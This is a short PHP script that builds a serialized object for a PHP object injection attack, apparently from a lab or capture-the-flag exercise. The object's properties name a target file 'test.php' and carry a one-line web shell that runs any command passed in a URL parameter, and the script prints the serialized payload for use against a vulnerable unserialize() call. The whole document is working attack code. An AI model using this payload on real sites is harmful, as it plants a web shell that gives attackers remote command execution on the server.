<?php

class App
{
    public $logfile = 'test.php';
    public $logData = '<?php system($_GET["c"]);?>';
}

$test = new App;

echo htmlspecialchars(serialize($test));
